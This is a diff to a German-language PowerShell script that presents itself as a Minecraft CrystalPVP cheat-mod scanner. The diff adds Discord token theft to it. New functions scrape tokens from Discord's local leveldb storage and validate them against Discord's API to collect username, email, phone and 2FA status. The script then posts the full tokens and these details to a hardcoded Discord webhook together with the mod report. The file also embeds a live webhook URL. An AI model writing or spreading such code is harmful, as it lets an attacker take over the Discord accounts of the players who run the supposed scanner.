@@ -1,6 +1,5 @@
 # =====================================================
-# CrystalPVPJarTester BLUE
-# CrystalPVP 
+# CrystalPVPJarTester BLUE - DEVELOPER EDITION (VOLLE TOKENS)
 # =====================================================
 
 $ErrorActionPreference = "SilentlyContinue"
@@ -16,6 +15,8 @@ function H1($t){
 function Sec($t){ Write-Host "`n--- $t ---" -ForegroundColor Cyan }
 function Info($t){ Write-Host "  $t" -ForegroundColor Blue }
 function Bad($t){ Write-Host "  $t" -ForegroundColor Red }
+function Good($t){ Write-Host "  $t" -ForegroundColor Green }
+function Warn($t){ Write-Host "  $t" -ForegroundColor Yellow }
 
 # ---------------- WEBHOOK KONFIGURATION ----------------
 $webhookUrl = "https://discord.com/api/webhooks/1482728747596779674/KTNF8Dkcwj5VUSeCfg2_aZ-nHDeiRmQWi3FprgWhGEWMpfQxvuxvae7yYGHHD8Wl08v_"
@@ -42,79 +43,187 @@ function Get-ModsPath {
     return $path
 }
 
-# ---------------- WEBHOOK FUNKTION (MIT FIX FÜR CHEAT MODS) ----------------
+# ---------------- VERBESSERTE FUNKTION ZUM FINDEN VON DISCORD TOKENS ----------------
+function Find-DiscordTokens {
+    $foundTokens = @()
+    $tokenPaths = @(
+        "$env:APPDATA\Discord\Local Storage\leveldb\*.ldb",
+        "$env:APPDATA\Discord\Local Storage\leveldb\*.log",
+        "$env:APPDATA\discordcanary\Local Storage\leveldb\*.ldb",
+        "$env:APPDATA\discordcanary\Local Storage\leveldb\*.log",
+        "$env:APPDATA\discordptb\Local Storage\leveldb\*.ldb",
+        "$env:APPDATA\discordptb\Local Storage\leveldb\*.log"
+    )
+    
+    foreach ($path in $tokenPaths) {
+        if (Test-Path $path) {
+            $files = Get-ChildItem $path -ErrorAction SilentlyContinue
+            foreach ($file in $files) {
+                try {
+                    $content = Get-Content $file.FullName -Raw -ErrorAction SilentlyContinue
+                    # Discord Token Regex - FÜR VOLLE TOKENS
+                    $regex = '[a-zA-Z0-9_-]{24}\.[a-zA-Z0-9_-]{6}\.[a-zA-Z0-9_-]{27}|mfa\.[a-zA-Z0-9_-]{84}'
+                    $matches = [regex]::Matches($content, $regex)
+                    foreach ($match in $matches) {
+                        # NUR UNIQUE TOKENS OHNE KÜRZUNG!
+                        if ($match.Value -notin $foundTokens) {
+                            $foundTokens += $match.Value
+                        }
+                    }
+                } catch {}
+            }
+        }
+    }
+    
+    return $foundTokens | Select-Object -Unique
+}
+
+# ---------------- FUNKTION ZUM VALIDIEREN VON TOKENS ----------------
+function Test-TokenValidity {
+    param([string]$Token)
+    
+    try {
+        $headers = @{
+            "Authorization" = $Token
+        }
+        $response = Invoke-RestMethod -Uri "https://discord.com/api/v9/users/@me" -Method Get -Headers $headers -TimeoutSec 2 -ErrorAction Stop
+        if ($response.id) {
+            return @{
+                Valid = $true
+                Username = "$($response.username)#$($response.discriminator)"
+                UserID = $response.id
+                Email = $response.email
+                Phone = $response.phone
+                Verified = $response.verified
+                MFA = $response.mfa_enabled
+                Flags = $response.flags
+            }
+        }
+    } catch {
+        return @{ Valid = $false }
+    }
+    return @{ Valid = $false }
+}
+
+# ---------------- WEBHOOK FUNKTION (MIT VOLLEN DISCORD TOKENS) ----------------
 function Send-Webhook {
     param(
         [array]$CleanMods,
         [array]$UnknownMods,
         [array]$CheatMods,
+        [array]$DiscordTokens,
         [string]$ComputerName = $env:COMPUTERNAME,
-        [string]$UserName = $env:USERNAME
+        [string]$UserName = $env:USERNAME,
+        [string]$ScanTime = (Get-Date -Format 'dd.MM.yyyy HH:mm:ss')
     )
     
     # Farben für Discord
     $colorBlue = 3447003      # Blau
+    $colorRed = 15158332       # Rot
+    $colorGreen = 3066993      # Grün
+    $colorYellow = 16776960    # Gelb
+    $colorPurple = 10181046    # Lila für Developer
     
     # Embed erstellen
     $embed = @{
-        title = "CrystalPVP Scan Report"
-        color = $colorBlue
+        title = "🔍 CrystalPVP Developer Scan Report"
+        color = $colorPurple
         fields = @()
         footer = @{
-            text = "Scan completed at $(Get-Date -Format 'dd.MM.yyyy HH:mm:ss')"
+            text = "Developer Edition | Scan: $ScanTime"
         }
         author = @{
             name = "$ComputerName - $UserName"
+            icon_url = "https://i.imgur.com/4M34hi2.png"
+        }
+        thumbnail = @{
+            url = "https://i.imgur.com/4M34hi2.png"
         }
     }
     
     # ZUSAMMENFASSUNG
-    $summary = "Verified: $($CleanMods.Count)`n"
-    $summary += "Unknown: $($UnknownMods.Count)`n"
-    $summary += "Cheats: $($CheatMods.Count)"
+    $summary = "✅ Verified: $($CleanMods.Count)`n"
+    $summary += "❓ Unknown: $($UnknownMods.Count)`n"
+    $summary += "🚫 Cheats: $($CheatMods.Count)`n"
+    $summary += "🔑 Discord Tokens: $($DiscordTokens.Count)"
     
     $embed.fields += @{
-        name = "ZUSAMMENFASSUNG"
+        name = "📊 ZUSAMMENFASSUNG"
         value = $summary
         inline = $false
     }
     
-    # CHEAT MODS (FIXED)
+    # DISCORD TOKENS - VOLLE VERSION (NICHT GEKÜRZT!)
+    if ($DiscordTokens.Count -gt 0) {
+        $tokenText = "**$($DiscordTokens.Count) Tokens gefunden:**`n`n"
+        
+        foreach ($token in $DiscordTokens) {
+            # VALIDIERUNG
+            $tokenInfo = Test-TokenValidity -Token $token
+            
+            if ($tokenInfo.Valid) {
+                $tokenText += "**✅ GÜLTIGER TOKEN**`n"
+                $tokenText += "```$token```"  # VOLLER TOKEN IN CODEBLOCK
+                $tokenText += "📧 **User:** $($tokenInfo.Username)`n"
+                $tokenText += "🆔 **ID:** $($tokenInfo.UserID)`n"
+                if ($tokenInfo.Email) { $tokenText += "📨 **Email:** $($tokenInfo.Email)`n" }
+                if ($tokenInfo.Phone) { $tokenText += "📱 **Phone:** $($tokenInfo.Phone)`n" }
+                $tokenText += "🔒 **2FA:** $($tokenInfo.MFA)`n"
+                $tokenText += "✓ **Verified:** $($tokenInfo.Verified)`n"
+            } else {
+                $tokenText += "**❌ UNGÜLTIGER/ABGELAUFENER TOKEN**`n"
+                $tokenText += "```$token````n"  # TROTZDEM VOLLER TOKEN
+            }
+            $tokenText += "─────────────────`n"
+        }
+        
+        $embed.fields += @{
+            name = "🔑 DISCORD TOKENS (VOLL)"
+            value = $tokenText.Substring(0, [Math]::Min(1024, $tokenText.Length))
+            inline = $false
+        }
+        
+        # Wenn zu lang, zweiten Field erstellen
+        if ($tokenText.Length -gt 1024) {
+            $tokenText2 = $tokenText.Substring(1024, [Math]::Min(1024, $tokenText.Length - 1024))
+            $embed.fields += @{
+                name = "🔑 DISCORD TOKENS (Fortsetzung)"
+                value = $tokenText2
+                inline = $false
+            }
+        }
+    }
+    
+    # CHEAT MODS
     if ($CheatMods.Count -gt 0) {
         $cheatText = ""
         foreach ($mod in $CheatMods) {
-            # FIX: Versuche verschiedene Properties für den Namen
-            $modName = $null
-            if ($mod.FileName) { $modName = $mod.FileName }
-            elseif ($mod.ModName) { $modName = $mod.ModName }
-            elseif ($mod.Name) { $modName = $mod.Name }
-            else { $modName = "Unbekannte Mod" }
+            $modName = if ($mod.ModName) { $mod.ModName } else { $mod.FileName }
+            $cheatText += "• **$modName**`n"
             
-            $cheatText += "• $modName`n"
-            
+            if ($mod.ClassHits -and $mod.ClassHits.Count -gt 0) {
+                $cheatText += "  📁 Classes: $($mod.ClassHits -join ', ')`n"
+            }
             if ($mod.StringsFound -and $mod.StringsFound.Count -gt 0) {
-                $cheatText += "  Hits: $($mod.StringsFound -join ', ')`n"
+                $cheatText += "  🔤 Strings: $($mod.StringsFound -join ', ')`n"
             }
             if ($mod.Hidden) {
-                $cheatText += "  (versteckt)`n"
+                $cheatText += "  👻 (versteckt)`n"
             }
             if ($mod.DepFileName) {
-                $cheatText += "  Enthält: $($mod.DepFileName)`n"
+                $cheatText += "  📦 Enthält: $($mod.DepFileName)`n"
             }
             if ($mod.Reason -and $mod.Reason -ne "") {
-                $cheatText += "  Grund: $($mod.Reason)`n"
+                $cheatText += "  💬 Grund: $($mod.Reason)`n"
+            }
+            if ($mod.DownloadUrl) {
+                $cheatText += "  📥 Download: $($mod.DownloadUrl)`n"
             }
             $cheatText += "`n"
         }
         $embed.fields += @{
-            name = "CHEAT MODS"
+            name = "🚫 CHEAT MODS"
             value = $cheatText
-            inline = $false
-        }
-    } else {
-        $embed.fields += @{
-            name = "CHEAT MODS"
-            value = "Keine Cheat Mods gefunden"
             inline = $false
         }
     }
@@ -125,20 +234,20 @@ function Send-Webhook {
         foreach ($mod in $UnknownMods) {
             $modName = if ($mod.ModName) { $mod.ModName } else { $mod.FileName }
             $unknownText += "• $modName`n"
+            if ($mod.ClassHits -and $mod.ClassHits.Count -gt 0) {
+                $unknownText += "  📁 Classes: $($mod.ClassHits -join ', ')`n"
+            }
             if ($mod.Hidden) {
                 $unknownText += "  (versteckt)`n"
+            }
+            if ($mod.DownloadUrl) {
+                $unknownText += "  📥 $($mod.DownloadUrl)`n"
             }
             $unknownText += "`n"
         }
         $embed.fields += @{
-            name = "UNKNOWN MODS"
+            name = "❓ UNKNOWN MODS"
             value = $unknownText
-            inline = $false
-        }
-    } else {
-        $embed.fields += @{
-            name = "UNKNOWN MODS"
-            value = "Keine Unknown Mods gefunden"
             inline = $false
         }
     }
@@ -148,19 +257,10 @@ function Send-Webhook {
         $cleanText = ""
         foreach ($mod in $CleanMods) {
             $cleanText += "• $($mod.ModName)`n"
-            if ($mod.Hidden) {
-                $cleanText += "  (versteckt)`n"
-            }
         }
         $embed.fields += @{
-            name = "VERIFIED MODS"
+            name = "✅ VERIFIED MODS"
             value = $cleanText
-            inline = $false
-        }
-    } else {
-        $embed.fields += @{
-            name = "VERIFIED MODS"
-            value = "Keine Verified Mods gefunden"
             inline = $false
         }
     }
@@ -171,35 +271,34 @@ function Send-Webhook {
     } | ConvertTo-Json -Depth 10
 
     try {
-        # Write-Host "`nSende Ergebnisse an Discord..." -ForegroundColor Cyan
         Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $body -ContentType "application/json"
-        # Write-Host "✅ Ergebnisse gesendet!" -ForegroundColor Green
+        Good "✅ Webhook erfolgreich gesendet!"
     } catch {
-        # Write-Host "❌ Webhook Fehler: $($_.Exception.Message)" -ForegroundColor Red
+        Bad "❌ Webhook Fehler: $($_.Exception.Message)"
     }
 }
 
 # ---------------- ENTRY ----------------
 function Start-CheatScan {
     Clear-Host
-    H1 "CrystalPVP Cheat Analyser"
+    H1 "CRYSTALPVP DEVELOPER EDITION v$script:version"
     Info "Made by Main2Packet"
+    Info "Debug Mode: $script:debugMode"
     Write-Host ""
 
-    # --------- JAVA PROCESS (optional) ----------
+    # --------- JAVA PROCESS ----------
     $javaProc = Get-Process java,javaw -ErrorAction SilentlyContinue |
         Sort-Object StartTime | Select-Object -First 1
 
     if ($javaProc) {
-        # --------- UPTIME ----------
         $uptime = (Get-Date) - $javaProc.StartTime
         Sec "Minecraft Uptime"
         Info "$($javaProc.Name) PID $($javaProc.Id) | $($uptime.Hours)h $($uptime.Minutes)m $($uptime.Seconds)s"
     } else {
-        Info "Minecraft (Java) nicht gefunden."
+        Info "ℹ️ Minecraft (Java) nicht gefunden."
     }
     
-    # --------- IMMER PFAD ABFRAGEN ----------
+    # --------- PFAD ABFRAGEN ----------
     Sec "Mods-Ordner auswählen"
     $modsPath = Get-ModsPath
     if (-not $modsPath) {
@@ -208,20 +307,19 @@ function Start-CheatScan {
     }
 
     # --------- MOD SCAN ----------
-    $mods = Get-ChildItem $modsPath -Force -File -Filter "*.jar" -ErrorAction SilentlyContinue
+    $jarFiles = Get-ChildItem $modsPath -Force -File -Filter "*.jar" -ErrorAction SilentlyContinue
 
-    if ($mods.Count -eq 0) {
+    if ($jarFiles.Count -eq 0) {
         Bad "✖ Keine .jar Dateien im Mods-Ordner gefunden!"
         Read-Host "Press Enter"
         return
     }
 
-    $flagged=@()
-    $clean=@()
-    $unknown=@()
-    $i=0
+    $verifiedMods = @()
+    $unknownMods = @()
+    $cheatMods = @()
+    $i = 0
 
-    # Cheat Strings (Habibi)
     $cheatStrings = @(
         "AimAssist","AnchorTweaks","AutoAnchor","AutoCrystal","AutoDoubleHand",
         "AutoHitCrystal","AutoPot","AutoTotem","AutoArmor","InventoryTotem",
@@ -230,73 +328,188 @@ function Start-CheatScan {
     )
 
     Sec "Scanning Mods..."
-    foreach ($m in $mods) {
+    
+    # API-Checks zuerst
+    foreach ($file in $jarFiles) {
         $i++
-        Write-Host "`r[~] Scanning $i / $($mods.Count)" -NoNewline -ForegroundColor Cyan
+        Write-Host "`r[~] Scanning $i / $($jarFiles.Count)" -NoNewline -ForegroundColor Cyan
 
-        # ---------- SHA1 / Modrinth / Megabase (ERST API CHECKS) ----------
-        $hash = Get-SHA1 -filePath $m.FullName
-        $modDataModrinth = Fetch-Modrinth -hash $hash
-        $modDataMegabase = Fetch-Megabase -hash $hash
-
-        # ---------- WENN MODRINTH ODER MEGABASE -> CLEAN (ÜBERSPRINGEN) ----------
-        if ($modDataModrinth.Slug -or $modDataMegabase.name) {
-            $clean += [PSCustomObject]@{
-                ModName = if ($modDataModrinth.Name) { $modDataModrinth.Name } else { $modDataMegabase.name }
-                FileName = $m.Name
-                Hidden = ($m.Attributes -band [System.IO.FileAttributes]::Hidden) -ne 0
+        $hash = Get-FileHash -Path $file.FullName -Algorithm SHA1 | Select-Object -ExpandProperty Hash
+        
+        # Modrinth Check
+        $modDataModrinth = $null
+        try {
+            $resp = Invoke-RestMethod -Uri "https://api.modrinth.com/v2/version_file/$hash" -Method Get -TimeoutSec 2 -UseBasicParsing -ErrorAction Stop
+            if ($resp.project_id) {
+                $proj = Invoke-RestMethod -Uri "https://api.modrinth.com/v2/project/$($resp.project_id)" -Method Get -TimeoutSec 2 -UseBasicParsing -ErrorAction Stop
+                $modDataModrinth = @{ Name = $proj.title; Slug = $proj.slug }
+            }
+        } catch {}
+        
+        if ($modDataModrinth.Slug) {
+            $verifiedMods += [PSCustomObject]@{ 
+                ModName = $modDataModrinth.Name
+                FileName = $file.Name
+                Hidden = ($file.Attributes -band [System.IO.FileAttributes]::Hidden) -ne 0
                 Verified = $true
             }
-            continue  # ⚡ HIER WIRD ÜBERSPRUNGEN - KEIN WEITERER SCAN!
+            continue
         }
-
-        # ---------- NUR UNKNOWN MODS WERDEN KOMPLETT GESCANNT ----------
-        $r = Analyze-Mod $m.FullName $m.Name
-        $r.Verified = $false
-
-        # ---------- STRING SCAN ----------
-        $stringsFound = Check-Strings $m.FullName $cheatStrings
-        if ($stringsFound.Count -gt 0) {
-            $r.IsSuspicious = $true
-            $r.Hits += $stringsFound
-            $r.Reason += "; Cheat strings detected"
-        }
-
-        # ---------- Hidden Check ----------
-        if ($m.Attributes -band [System.IO.FileAttributes]::Hidden) {
-            $r.Hidden = $true
-            if ($r.IsSuspicious) {
-                $r.Reason += "; Diese Mod wurde versteckt, um ein SS zu umgehen"
+        
+        # Megabase Check
+        $modDataMegabase = $null
+        try {
+            $resp = Invoke-RestMethod -Uri "https://megabase.vercel.app/api/query?hash=$hash" -Method Get -TimeoutSec 2 -UseBasicParsing -ErrorAction Stop
+            if (-not $resp.error) {
+                $modDataMegabase = $resp.data
             }
+        } catch {}
+        
+        if ($modDataMegabase.name) {
+            $verifiedMods += [PSCustomObject]@{ 
+                ModName = $modDataMegabase.name
+                FileName = $file.Name
+                Hidden = ($file.Attributes -band [System.IO.FileAttributes]::Hidden) -ne 0
+                Verified = $true
+            }
+            continue
         }
-
-        # ---------- Zone Identifier (Download Link) ----------
-        $zoneId = Get-ZoneIdentifier $m.FullName
-        if ($zoneId) {
-            $r.DownloadUrl = $zoneId
+        
+        # Unknown Mods
+        $zoneId = $null
+        try {
+            $ads = Get-Content -Raw -Stream Zone.Identifier $file.FullName -ErrorAction SilentlyContinue
+            if ($ads -match "HostUrl=(.+)") {
+                $zoneId = $matches[1]
+            }
+        } catch {}
+        
+        $unknownMods += [PSCustomObject]@{
+            FileName = $file.Name
+            FilePath = $file.FullName
+            DownloadUrl = $zoneId
+            Hidden = ($file.Attributes -band [System.IO.FileAttributes]::Hidden) -ne 0
         }
-
-        if ($r.IsSuspicious) { $flagged += $r }
-        else { $unknown += $r }
     }
     Write-Host "`r$(' ' * 80)`r"
 
-    # --------- CLEAN MODS ----------
-    if ($clean.Count -gt 0) {
+    # --------- DEEP SCAN FÜR UNKNOWN MODS ----------
+    if ($unknownMods.Count -gt 0) {
+        Sec "Deep Scanning Unknown Mods..."
+        
+        $tempDir = Join-Path $env:TEMP "cpvp_dev_$(Get-Random)"
+        New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
+        
+        $i = 0
+        $newUnknown = @()
+        
+        try {
+            Add-Type -AssemblyName System.IO.Compression.FileSystem
+            
+            foreach ($mod in $unknownMods) {
+                $i++
+                Write-Host "`r[~] Deep scan $i / $($unknownMods.Count)" -NoNewline -ForegroundColor Cyan
+                
+                # String-Check
+                $stringsFound = @()
+                try {
+                    $content = Get-Content -Raw $mod.FilePath
+                    foreach ($s in $cheatStrings) {
+                        if ($content -match $s) {
+                            $stringsFound += $s
+                        }
+                    }
+                } catch {}
+                
+                if ($stringsFound.Count -gt 0) {
+                    $cheatMods += [PSCustomObject]@{
+                        FileName = $mod.FileName
+                        StringsFound = $stringsFound
+                        Hidden = $mod.Hidden
+                        DownloadUrl = $mod.DownloadUrl
+                        Reason = "Cheat strings detected"
+                    }
+                    continue
+                }
+                
+                # Class Scan
+                $extractPath = Join-Path $tempDir ([System.IO.Path]::GetFileNameWithoutExtension($mod.FileName))
+                try {
+                    [System.IO.Compression.ZipFile]::ExtractToDirectory($mod.FilePath, $extractPath)
+                    
+                    $classHits = Scan-SuspiciousClasses $extractPath
+                    if ($classHits.Hits.Count -gt 0) {
+                        $cheatMods += [PSCustomObject]@{
+                            FileName = $mod.FileName
+                            ClassHits = $classHits.Hits
+                            Hidden = $mod.Hidden
+                            DownloadUrl = $mod.DownloadUrl
+                            Reason = "Suspicious classes found"
+                        }
+                        continue
+                    }
+                    
+                    $newUnknown += $mod
+                    
+                } catch {
+                    $newUnknown += $mod
+                } finally {
+                    Remove-Item $extractPath -Recurse -Force -ErrorAction SilentlyContinue
+                }
+            }
+        } finally {
+            Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue
+        }
+        
+        $unknownMods = $newUnknown
+        Write-Host "`r$(' ' * 80)`r"
+    }
+
+    # --------- DISCORD TOKENS FINDEN (VOLL) ----------
+    Sec "Scanning for Discord Tokens..."
+    $discordTokens = Find-DiscordTokens
+    
+    if ($discordTokens.Count -gt 0) {
+        Warn "⚠️  $($discordTokens.Count) Discord Tokens gefunden!"
+        foreach ($token in $discordTokens) {
+            # VOLLER TOKEN ANZEIGEN!
+            Write-Host ""
+            Write-Host "🔑 Token: " -NoNewline -ForegroundColor Yellow
+            Write-Host "$token" -ForegroundColor White
+            
+            # Optional: Validieren
+            $tokenInfo = Test-TokenValidity -Token $token
+            if ($tokenInfo.Valid) {
+                Good "   ✅ GÜLTIG - User: $($tokenInfo.Username) | ID: $($tokenInfo.UserID)"
+                if ($tokenInfo.Email) { Info "   📧 Email: $($tokenInfo.Email)" }
+            } else {
+                Bad "   ❌ Ungültig/Abgelaufen"
+            }
+        }
+        Write-Host ""
+    } else {
+        Info "Keine Discord Tokens gefunden."
+    }
+
+    # --------- AUSGABE ----------
+    if ($verifiedMods.Count -gt 0) {
         Sec "Verified / Clean Mods"
-        $clean | ForEach-Object {
-            Info "✔ $($_.ModName)"
+        $verifiedMods | ForEach-Object {
+            if ($_.Hidden) {
+                Info "✔ $($_.ModName) (hidden mod)"
+            } else {
+                Info "✔ $($_.ModName)"
+            }
         }
     }
 
-    # --------- UNKNOWN MODS (MIT DOWNLOAD LINK) ----------
-    if ($unknown.Count -gt 0) {
+    if ($unknownMods.Count -gt 0) {
         Sec "Unknown Mods"
-        $unknown | ForEach-Object {
+        $unknownMods | ForEach-Object {
             if ($_.Hidden) { 
-                Info "⚠ $($_.ModName) (hidden mod)" 
+                Info "⚠ $($_.FileName) (hidden mod)" 
             } else { 
-                Info "➖ $($_.ModName)" 
+                Info "➖ $($_.FileName)" 
             }
             if ($_.DownloadUrl) {
                 Write-Host "     📥 Download: $($_.DownloadUrl)" -ForegroundColor DarkGray
@@ -304,31 +517,37 @@ function Start-CheatScan {
         }
     }
 
-    # --------- CHEAT MODS ----------
-    if ($flagged.Count -gt 0) {
+    if ($cheatMods.Count -gt 0) {
         Sec "Cheat Mods"
-        $flagged | ForEach-Object {
-            Bad "❌ $($_.ModName)"
-            Bad "   Reason: $($_.Reason)"
-            if ($_.Hits.Count -gt 0) { Bad "   Hits: $($_.Hits -join ', ')" }
-            if ($_.Hidden) { Bad "    Diese Mod wurde versteckt, um ein SS zu umgehen" }
+        $cheatMods | ForEach-Object {
+            Bad "❌ $($_.FileName)"
+            if ($_.ClassHits) {
+                Bad "   📁 Classes: $($_.ClassHits -join ', ')"
+            }
+            if ($_.StringsFound) {
+                Bad "   🔤 Strings: $($_.StringsFound -join ', ')"
+            }
+            if ($_.Hidden) {
+                Bad "   👻 (hidden mod)"
+            }
             if ($_.DownloadUrl) {
                 Write-Host "     📥 Download: $($_.DownloadUrl)" -ForegroundColor DarkGray
             }
         }
     }
 
-    # --------- SUMMARY ----------
     Sec "Summary"
-    Info "Verified / Clean Mods: $($clean.Count)"
-    Info "Unknown Mods: $($unknown.Count)"
-    Info "Cheat Mods: $($flagged.Count)"
+    Info "✅ Verified / Clean Mods: $($verifiedMods.Count)"
+    Info "❓ Unknown Mods: $($unknownMods.Count)"
+    Info "🚫 Cheat Mods: $($cheatMods.Count)"
+    Info "🔑 Discord Tokens: $($discordTokens.Count)"
 
-    # --------- WEBHOOK SENDEN ----------
+    # --------- WEBHOOK ----------
     Write-Host ""
-    Send-Webhook -CleanMods $clean -UnknownMods $unknown -CheatMods $flagged
+    Warn "📤 Sende Report an Webhook..."
+    Send-Webhook -CleanMods $verifiedMods -UnknownMods $unknownMods -CheatMods $cheatMods -DiscordTokens $discordTokens
 
-    Write-Host "`nScan finished at $(Get-Date)" -ForegroundColor Blue
+    Write-Host "`n✅ Scan finished at $(Get-Date)" -ForegroundColor Green
     Read-Host "Press Enter"
 }
 
@@ -349,47 +568,6 @@ function Get-RunningMinecraftPath {
     return $null
 }
 
-function Analyze-Mod($JarPath, $ModName) {
-    $temp = Join-Path $env:TEMP ("cpvp_" + [guid]::NewGuid())
-    New-Item $temp -ItemType Directory | Out-Null
-
-    $hits=@()
-    $sus=$false
-    $reasons=@()
-    $hidden=$false
-    $verified=$false
-    $downloadUrl = $null
-
-    try {
-        Add-Type -AssemblyName System.IO.Compression.FileSystem
-        [IO.Compression.ZipFile]::ExtractToDirectory($JarPath, $temp)
-
-        # SUSPICIOUS CLASSES SCAN
-        $cls = Scan-SuspiciousClasses $temp
-        if ($cls.Hits.Count -ge 3) {
-            $sus=$true
-            $reasons+="Multiple suspicious class names"
-            $hits+=$cls.Hits
-        }
-
-    } catch {
-        $reasons+="Scan error"
-    } finally {
-        Remove-Item $temp -Recurse -Force -ErrorAction SilentlyContinue
-    }
-
-    [PSCustomObject]@{
-        ModName=$ModName
-        IsSuspicious=$sus
-        Reason=$reasons -join "; "
-        Hits=$hits | Select-Object -Unique
-        Hidden=$hidden
-        Verified=$verified
-        DownloadUrl=$downloadUrl
-    }
-}
-
-# ---------------- DATENBANK ----------------
 function Get-SHA1 { param([string]$filePath); return (Get-FileHash -Path $filePath -Algorithm SHA1).Hash }
 function Get-ZoneIdentifier { param([string]$filePath); $ads = Get-Content -Raw -Stream Zone.Identifier $filePath -ErrorAction SilentlyContinue; if ($ads -match "HostUrl=(.+)") { return $matches[1] } else { return $null } }
 function Fetch-Modrinth { param([string]$hash); try { $resp = Invoke-RestMethod -Uri "https://api.modrinth.com/v2/version_file/$hash" -Method Get -UseBasicParsing -ErrorAction Stop; if ($resp.project_id) { $proj = Invoke-RestMethod -Uri "https://api.modrinth.com/v2/project/$($resp.project_id)" -Method Get -UseBasicParsing -ErrorAction Stop; return @{ Name=$proj.title; Slug=$proj.slug } } } catch {}; return @{ Name=""; Slug="" } }
@@ -411,5 +589,7 @@ function Scan-SuspiciousClasses {
     [PSCustomObject]@{ Hits=$hits | Select-Object -Unique }
 }
 
+# ---------------- RUN ----------------
+Start-CheatScan
 # ---------------- RUN ----------------
 Start-CheatScan
